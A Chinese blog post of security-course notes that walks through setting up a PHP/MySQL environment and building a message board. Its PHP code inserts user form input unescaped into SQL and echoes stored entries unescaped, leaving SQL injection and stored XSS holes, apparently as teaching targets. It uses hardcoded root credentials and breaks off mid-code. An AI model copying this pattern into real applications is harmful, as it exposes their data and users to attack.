<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>小迪安全--安全开发上篇(3) | GoldY</title><meta name="author" content="GoldY"><meta name="copyright" content="GoldY"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="小迪安全第二部分，安全开发讲解。">
<meta property="og:type" content="article">
<meta property="og:title" content="小迪安全--安全开发上篇(3)">
<meta property="og:url" content="https://www.geekgold.xyz/posts/b4ffc751.html">
<meta property="og:site_name" content="GoldY">
<meta property="og:description" content="小迪安全第二部分，安全开发讲解。">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://www.geekgold.xyz/img/xiao_f.jpg">
<meta property="article:published_time" content="2025-06-12T13:08:57.606Z">
<meta property="article:modified_time" content="2025-06-12T13:09:52.958Z">
<meta property="article:author" content="GoldY">
<meta property="article:tag" content="网络安全">
<meta property="article:tag" content="小迪安全">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://www.geekgold.xyz/img/xiao_f.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "小迪安全--安全开发上篇(3)",
  "url": "https://www.geekgold.xyz/posts/b4ffc751.html",
  "image": "https://www.geekgold.xyz/img/xiao_f.jpg",
  "datePublished": "2025-06-12T13:08:57.606Z",
  "dateModified": "2025-06-12T13:09:52.958Z",
  "author": [
    {
      "@type": "Person",
      "name": "GoldY",
      "url": "https://www.geekgold.xyz/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://www.geekgold.xyz/posts/b4ffc751.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="bing-site-verification" content="E05CD8D6921B8F2AA32324DF2B267557"/><meta name="baidu-site-verification" content="codeva-tCktTl1n17"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":2,"unescape":false,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '小迪安全--安全开发上篇(3)',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/bg2.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/preview.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">25</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-link"></i><span> 工具链接</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/link/"><i class="fa-fw fa fa-cog"></i><span> 渗透工具</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/xiao_f.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/logo.png" alt="Logo"><span class="site-name">GoldY</span></a><a class="nav-page-title" href="/"><span class="site-name">小迪安全--安全开发上篇(3)</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-link"></i><span> 工具链接</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/link/"><i class="fa-fw fa fa-cog"></i><span> 渗透工具</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">小迪安全--安全开发上篇(3)</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-06-12T13:08:57.606Z" title="发表于 2025-06-12 21:08:57">2025-06-12</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-06-12T13:09:52.958Z" title="更新于 2025-06-12 21:09:52">2025-06-12</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/">小迪安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">29.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>121分钟</span></span><span class="post-meta-separator">|</span><span id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="twikoo_visitors"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><p>参考文档：<a target="_blank" rel="noopener" href="https://blog.csdn.net/wushangyu32335/article/details/135818611?spm=1001.2014.3001.5502">025-安全开发-PHP应用&amp;文件管理&amp;包含&amp;写入&amp;删除&amp;下载&amp;上传&amp;遍历&amp;安全_php 文件管理-CSDN博客</a></p>
<h2 id="第一天"><a href="#第一天" class="headerlink" title="第一天"></a>第一天</h2><p><strong>PHP应用&amp;留言板功能&amp;超<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F&spm=1001.2101.3001.7020">全局变量</a>&amp;数据库操作&amp;第三方</strong></p>
<p><strong>插件引用</strong></p>
<h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><h4 id="安装PHPStrom"><a href="#安装PHPStrom" class="headerlink" title="安装PHPStrom"></a>安装PHPStrom</h4><p><a target="_blank" rel="noopener" href="https://www.jetbrains.com/phpstorm/">PhpStorm: The PHP IDE by JetBrains</a></p>
<h4 id="配置PHPStudy"><a href="#配置PHPStudy" class="headerlink" title="配置PHPStudy"></a>配置PHPStudy</h4><p>安装Mysql管理工具：<a target="_blank" rel="noopener" href="https://www.navicat.com.cn/download/navicat-premium">https://www.navicat.com.cn/download/navicat-premium</a></p>
<p>1、开启phpstudy的中间件和数据库服务，修改php的版本为7.0.9</p>
<img src="/img/xiaodi/image-20250514164102006.png" alt="image-20250514164102006" style="zoom: 33%;" />

<img src="/img/xiaodi/image-20250514164135741.png" alt="image-20250514164135741" style="zoom:33%;" />

<p>2、使用Navicat创建所需要的表名和字段</p>
<p><img src="/img/xiaodi/image-20250514174545057.png" alt="image-20250514174545057"></p>
<p>3、使用PHPStorm项目创建php项目</p>
<p>注意：</p>
<ul>
<li>新建项目位置：G:\develop\safety\phpstudy_pro\WWW\demo1</li>
<li>解释器使用phpstudy目录下的phpstudy_pro\Extensions\php\php7.0.9nts\php.exe</li>
<li><img src="/img/xiaodi/image-20250514180205687-1747216927433-1.png" alt="image-20250514180205687"></li>
</ul>
<h3 id="数据库操作-增删改查"><a href="#数据库操作-增删改查" class="headerlink" title="数据库操作-增删改查"></a>数据库操作-增删改查</h3><p>PHP函数：连接，选择，执行，结果，关闭等</p>
<p>PHP相关函数</p>
<blockquote>
<p>mysqli_connect() 打开一个到MySQL的新的连接。<br>mysqli_select_db() 更改连接的默认数据库。<br>mysqli_query() 执行某个针对数据库的查询。<br>mysqli_fetch_row() 从结果集中取得一行，并作为枚举数组返回。<br>mysqli_close() 关闭先前打开的数据库连接。</p>
</blockquote>
<p>SQL相关语句</p>
<blockquote>
<p>查：select * from 表名 where 列名&#x3D;‘条件’;<br>增：insert into 表名(列名1, 列名2) value(‘列1值1’, ‘列2值2’);<br>删：delete from 表名 where 列名 &#x3D; ‘条件’;<br>改：update 表名 set 列名 &#x3D; 数据 where 列名 &#x3D; ‘条件’;</p>
</blockquote>
<h3 id="PHP留言板前后端功能实现"><a href="#PHP留言板前后端功能实现" class="headerlink" title="PHP留言板前后端功能实现"></a><strong>PHP留言板前后端功能实现</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- HTML 表单 --&gt;</span><br><span class="line">&lt;form id=<span class="string">&quot;form1&quot;</span> name=<span class="string">&quot;form1&quot;</span> method=<span class="string">&quot;post&quot;</span> action=<span class="string">&quot;&quot;</span>&gt;</span><br><span class="line">    &lt;p&gt;</span><br><span class="line">        &lt;!-- 用户名输入框 --&gt;</span><br><span class="line">        用户名：&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span>&gt;</span><br><span class="line">    &lt;/p&gt;</span><br><span class="line">    &lt;p&gt;</span><br><span class="line">        内容：</span><br><span class="line">    &lt;/p&gt;</span><br><span class="line">    &lt;p&gt;</span><br><span class="line">        &lt;!-- 文本框 --&gt;</span><br><span class="line">        &lt;textarea name=<span class="string">&quot;content&quot;</span>&gt;&lt;/textarea&gt;</span><br><span class="line">    &lt;/p&gt;</span><br><span class="line">    &lt;!-- 提交按钮 --&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> id=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 数据库连接参数</span></span><br><span class="line"><span class="variable">$dbip</span> = <span class="string">&#x27;localhost&#x27;</span>;</span><br><span class="line"><span class="variable">$dbuser</span> = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"><span class="variable">$dbpass</span> = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用 mysqli_connect() 函数建立与数据库的连接</span></span><br><span class="line"><span class="variable">$con</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$dbip</span>, <span class="variable">$dbuser</span>, <span class="variable">$dbpass</span>, <span class="variable">$dbname</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查连接是否成功</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$con</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;连接错误：&quot;</span> . <span class="title function_ invoke__">mysqli_connect_errno</span>());</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 获取用户名</span></span><br><span class="line">    <span class="variable">$u</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查用户名是否非空</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$u</span>)) &#123;</span><br><span class="line">        <span class="comment">// 获取内容、IP地址和用户代理信息</span></span><br><span class="line">        <span class="variable">$c</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">        <span class="variable">$i</span> = @<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]; <span class="comment">/*获取客户端 IP 地址*/</span></span><br><span class="line">        <span class="variable">$ua</span> = @<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];<span class="comment">/*获取客户端用户代理信息*/</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 数据库查询语句，将数据插入到名为 gbook 的表中</span></span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO gbook(`username`, `content`, `ipaddr`, `uagent`) VALUES (&#x27;<span class="subst">$u</span>&#x27;, &#x27;<span class="subst">$c</span>&#x27;, &#x27;<span class="subst">$i</span>&#x27;, &#x27;<span class="subst">$ua</span>&#x27;);&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 执行数据库查询</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>, <span class="variable">$sql</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;留言成功！&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 查询并显示留言列表</span></span><br><span class="line">            <span class="variable">$sql1</span> = <span class="string">&quot;SELECT * FROM gbook&quot;</span>;</span><br><span class="line">            <span class="variable">$data</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>, <span class="variable">$sql1</span>);</span><br><span class="line">            <span class="keyword">while</span> (<span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_row</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;用户名：&#x27;</span> . <span class="variable">$row</span>[<span class="number">0</span>] . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;内容：&#x27;</span> . <span class="variable">$row</span>[<span class="number">1</span>] . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;IP地址：&#x27;</span> . <span class="variable">$row</span>[<span class="number">2</span>] . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;UA浏览器：&#x27;</span> . <span class="variable">$row</span>[<span class="number">3</span>] . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;留言失败！&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 用户名为空的情况</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;用户名不能为空！&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="HTML表单部分"><a href="#HTML表单部分" class="headerlink" title="HTML表单部分"></a>HTML表单部分</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;form1&quot;</span> <span class="attr">name</span>=<span class="string">&quot;form1&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 用户名输入框 --&gt;</span></span><br><span class="line">        用户名：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">        内容：</span><br><span class="line">    <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 文本框 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">name</span>=<span class="string">&quot;content&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 提交按钮 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">id</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p>解释：</p>
<blockquote>
<p>创建form表单：</p>
<p><code>&lt;form id=&quot;form1&quot; name=&quot;form1&quot; method=&quot;post&quot; action=&quot;&quot;&gt; &lt;/form&gt;</code></p>
<p>id：为标签名，进行标识（唯一）</p>
<p>name： 表单名称</p>
<p>method：表单提交的方法使用POST方式</p>
<p>action：<code>action=&quot;&quot;</code> 通常是在 HTML 表单中的 <strong><code>&lt;form&gt;</code></strong> 元素中设置 <strong><code>action</code></strong> 属性来指定表单提交的目标 URL。如果 <strong><code>action</code></strong> 属性为空字符串 (<strong><code>action=&quot;&quot;</code></strong>)，则表单数据将被提<strong>交到当前页面的 URL</strong>。</p>
<p>段落标签：<code>&lt;p&gt;&lt;/p&gt;</code></p>
<p>用户名输入框：</p>
<p><code>&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;</code></p>
<p>type：类型</p>
<p>name：输入框名称</p>
<p>文本框：</p>
<p><code>&lt;textarea name=&quot;content&quot;&gt;&lt;/textarea&gt;</code></p>
<p>提交按钮：</p>
<p><code>&lt;input type=&quot;submit&quot; name=&quot;submit&quot; id=&quot;submit&quot; value=&quot;提交&quot;&gt;</code></p>
<p><img src="/img/xiaodi/image-20250514181552656.png" alt="image-20250514181552656"></p>
</blockquote>
<h4 id="PHP部分"><a href="#PHP部分" class="headerlink" title="PHP部分"></a>PHP部分</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 数据库连接参数</span></span><br><span class="line"><span class="variable">$dbip</span> = <span class="string">&#x27;localhost&#x27;</span>;</span><br><span class="line"><span class="variable">$dbuser</span> = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"><span class="variable">$dbpass</span> = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用 mysqli_connect() 函数建立与数据库的连接</span></span><br><span class="line"><span class="variable">$con</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$dbip</span>, <span class="variable">$dbuser</span>, <span class="variable">$dbpass</span>, <span class="variable">$dbname</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查连接是否成功</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$con</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;连接错误：&quot;</span> . <span class="title function_ invoke__">mysqli_connect_errno</span>());</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 获取用户名</span></span><br><span class="line">    <span class="variable">$u</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查用户名是否非空</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$u</span>)) &#123;</span><br><span class="line">        <span class="comment">// 获取内容、IP地址和用户代理信息</span></span><br><span class="line">        <span class="variable">$c</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">        <span class="variable">$i</span> = @<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]; <span class="comment">/*获取客户端 IP 地址*/</span></span><br><span class="line">        <span class="variable">$ua</span> = @<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];<span class="comment">/*获取客户端用户代理信息*/</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 数据库查询语句，将数据插入到名为 gbook 的表中</span></span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO gbook(`username`, `content`, `ipaddr`, `uagent`) VALUES (&#x27;<span class="subst">$u</span>&#x27;, &#x27;<span class="subst">$c</span>&#x27;, &#x27;<span class="subst">$i</span>&#x27;, &#x27;<span class="subst">$ua</span>&#x27;);&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 执行数据库查询</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>, <span class="variable">$sql</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;留言成功！&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 